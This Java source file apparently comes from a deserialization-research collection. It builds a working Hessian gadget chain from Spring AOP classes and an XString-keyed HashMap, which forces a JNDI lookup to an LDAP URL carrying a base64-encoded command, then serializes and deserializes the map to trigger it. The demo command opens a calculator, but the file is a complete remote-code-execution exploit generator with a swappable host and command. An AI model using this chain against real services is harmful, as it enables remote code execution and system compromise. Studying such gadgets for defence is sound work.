package org.su18.serialize.hessian.SpringPartiallyComparableAdvisorHolder;

import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.JndiAccessor;
import org.springframework.jndi.JndiTemplate;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import org.su18.serialize.utils.ClassUtil;
import org.su18.serialize.utils.HessianUtils;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * @author su18
 */
public class SpringPartiallyComparableAdvisorHolder {

	public static void main(String[] args) throws Exception {

		String jndiUrl = "ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==";

		SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
		bf.setShareableResources(jndiUrl);

		Field f = JndiAccessor.class.getDeclaredField("logger");
		f.setAccessible(true);
		f.set(bf, new NoOpLog());

		Field f2 = JndiTemplate.class.getDeclaredField("logger");
		f2.setAccessible(true);
		f2.set(bf.getJndiTemplate(), new NoOpLog());

		BeanFactoryAspectInstanceFactory aif = (BeanFactoryAspectInstanceFactory)
				ClassUtil.createInstanceUnsafely(BeanFactoryAspectInstanceFactory.class);


		Field f3 = BeanFactoryAspectInstanceFactory.class.getDeclaredField("beanFactory");
		f3.setAccessible(true);
		f3.set(aif, bf);

		Field f4 = BeanFactoryAspectInstanceFactory.class.getDeclaredField("name");
		f4.setAccessible(true);
		f4.set(aif, jndiUrl);


		AbstractAspectJAdvice advice = (AbstractAspectJAdvice)
				ClassUtil.createInstanceUnsafely(AspectJAroundAdvice.class);


		Field f5 = AbstractAspectJAdvice.class.getDeclaredField("aspectInstanceFactory");
		f5.setAccessible(true);
		f5.set(advice, aif);

		AspectJPointcutAdvisor advisor = (AspectJPointcutAdvisor) ClassUtil.createInstanceUnsafely(AspectJPointcutAdvisor.class);

		Field f7 = AspectJPointcutAdvisor.class.getDeclaredField("advice");
		f7.setAccessible(true);
		f7.set(advisor, advice);

		Class<?> pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
		Object   pcah   = ClassUtil.createInstanceUnsafely(pcahCl);
		Field    f8     = pcahCl.getDeclaredField("advisor");
		f8.setAccessible(true);
		f8.set(pcah, advisor);

		XString xString = new XString("su18");

		// 感觉是纯炫技写法
//		HotSwappableTargetSource hsts1 = new HotSwappableTargetSource(pcah);
//		HotSwappableTargetSource hsts2 = new HotSwappableTargetSource(xString);

		HashMap map = new HashMap();

		// 放入 pcahCl 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前
		map.put(pcah, "su18");
		Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m) {
			if ("putVal".equals(method.getName())) {
				method.setAccessible(true);
				method.invoke(map, -1, pcah, 0, false, true);
			}
		}

		// 放入 XString 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前
		map.put(xString, "su19");
		Method[] m2 = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m2) {
			if ("putVal".equals(method.getName())) {
				method.setAccessible(true);
				method.invoke(map, -1, xString, 0, false, true);
			}
		}

		byte[] baos = HessianUtils.hessianSerialize(map, "hessian2");
		HessianUtils.hessianSerializeToObj(baos, "hessian2");
	}

}
